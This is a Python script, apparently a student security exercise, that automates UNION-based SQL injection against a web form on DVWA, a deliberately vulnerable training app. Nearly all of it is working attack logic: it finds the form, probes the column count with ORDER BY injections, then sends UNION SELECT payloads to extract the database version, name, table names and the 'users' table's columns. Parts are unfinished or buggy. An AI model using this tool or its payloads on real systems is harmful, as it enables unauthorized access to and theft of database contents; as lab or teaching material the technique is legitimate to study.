#!/usr/bin/python3
import argparse
import requests
import re
import os
import difflib

REQUEST_TYPES = set(["get", "post"])

token = os.environ.get('TOKEN')
cookies = {'PHPSESSID': token, "security": "low"}

def error_exit(msg):
	print(f"Error: {msg}")
	exit(1)

def form_url(url, add):
	if add == "#":
		return url
	if add.startswith('/'):
		if url.endswith('/'):
			url = url[:-1]
		return url + add

	baseurl_match = re.search(r'^(https?://[^/]+)', url)
	if not baseurl_match:
		error_exit(f"worng url - {url}")
	baseurl = baseurl_match.group()
	return baseurl + '/' + add

def print_diff(str1, str2):
	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
	cnt = 0
	for d in diff:
		cnt = cnt + 1
		if cnt < 4:
			continue
		print(d)
	print(diff)

class Union:
	def __init__(self, submit):
		self.submit = submit
		self.delimiter = "'"
		self.header = self.delimiter + " UNION "
		self.comment = "#"

		self.original_text = self.submit("").text

		self.colum_counts = self.check_num_colums()

	def check_num_colums(self):
		for i in range(1, 10):
			q = f" ORDER BY {i}"
			query = self.delimiter + q + self.comment
			res = self.submit(query)
			if not res.text.strip().startswith("<!DOCTYPE"):
				break
		colum_counts = i - 1
		print(f"colum counts: {colum_counts}")
		return colum_counts

	def exec_union(self, colum_name, contents):
		colum_lst = [colum_name] * self.colum_counts
		colums = ", ".join(colum_lst)
		query = self.header + "SELECT " + colums + contents + self.comment
		print(f"QUERY: {query}")
		res = self.submit(query)
		print_diff(self.original_text, res.text)

	def get_version(self):
		self.exec_union("@@version", "")

	def get_database_name(self):
		self.exec_union("DATABASE()", "")

	def get_table_names(self):
		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
		self.exec_union("table_name", contents)

	def get_column_names(self):
		contents = " FROM information_schema.columns WHERE table_name = 'users'"
		self.exec_union("column_name", contents)

	def get_all_data(self):
		# not correct
		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
		self.exec_union("table_name", contents)

	def union(self):
		self.get_version()
		self.get_database_name()
		self.get_table_names()
		self.get_column_names()
		self.get_all_data()

class Vaccine:
	def __init__(self, url, file, method):
		self.url = url
		self.file = file
		self.method = method

		txt = self.request()
		form = self.get_form(txt)
		self.request_url = self.get_request_url(form)
		field = self.get_field_names(form)
		if len(field) > 2:
			self.username_field_name = field[0]
			self.password_field_name = field[1]
		else:
			self.username_field_name = None
			self.password_field_name = field[0]

	def __str__(self):
		return f'''- url: {self.url}
- request-url: {self.request_url}
- method: {self.method}
- username-field: {self.username_field_name}
- password-field: {self.password_field_name}'''

	def get_form(self, txt):
		forms = re.findall(r'(<form(.|\s)*?</form>)', txt)

		if not forms:
			error_exit("form block does not exist")
		filtered_froms = []
		for form in forms:
			method_match = re.search(r'method="(.*?)"', form[0])
			print(method_match, self.method)
			if not method_match:
				continue
			if method_match.group(1).lower() != self.method:
				continue
			filtered_froms.append(form[0])

		if not filtered_froms:
			error_exit("method does not match")
		if len(filtered_froms) > 1:
			error_exit("multiple fields exist, cannot determin")
		return filtered_froms[0]

	def get_field_names(self, form):
		return re.findall(r'<input[^>]+name="(.*?)"', form)

	def get_request_url(self, form):
		actions = re.findall(r'<form[^>]+action="(.*?)"', form)
		if not actions:
			return self.url
		if len(actions) > 1:
			error_exit("too many actions found")
		return form_url(self.url, actions[0])

	def request(self):
		try:
			response = requests.get(self.url, cookies=cookies)
		except requests.exceptions.ConnectionError:
			error_exit(f"connection refused - {self.url}")
		except Exception as e:
			error_exit(e)
		if response.status_code == 302:
			error_exit("no cookie found")
			return request()

		if response.status_code != 200:
			error_exit(f"{self.url} - {response}")
		return response.text

	def submit(self, password, username=""):
		if self.username_field_name:
			payload = {
				self.username_field_name: username,
				self.password_field_name: password
			}
		else:
			payload = {
				self.password_field_name: password,
				"Submit" : "Submit"
			}
		res = requests.get(self.request_url, params=payload, cookies=cookies)
		if self.method == "get":
			res = requests.get(self.request_url, params=payload, cookies=cookies)
		elif self.method == "post":
			res = requests.post(self.request_url, data=payload, cookies=cookies)
		return res

	def vaccine(self):
		self.submit("admin", "aaa")
		u = Union(self.submit)
		u.union()

def validate_args(args):
	if not args.url.startswith('https://') and \
		not args.url.startswith('http://'):
		args.url = 'https://' + args.url
	args.x = args.x.lower()
	if args.x not in REQUEST_TYPES:
		error_exit(f"Request type {args.x} is not supported")

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("url", metavar="URL", type=str)
	parser.add_argument("-o", type=str, default="archive.txt",
		help="Archive file, if not specified it will be stored in a default one.")
	parser.add_argument("-x", type=str, default="GET",
		help="Type of request, if not specified GET will be used.")
	args = parser.parse_args()

	return args

def main():
	args = parse_args()
	validate_args(args)
	vaccine = Vaccine(args.url, args.o, args.x)
	vaccine.vaccine()
	print(vaccine)
	print(args)

if __name__ == '__main__':
	main()
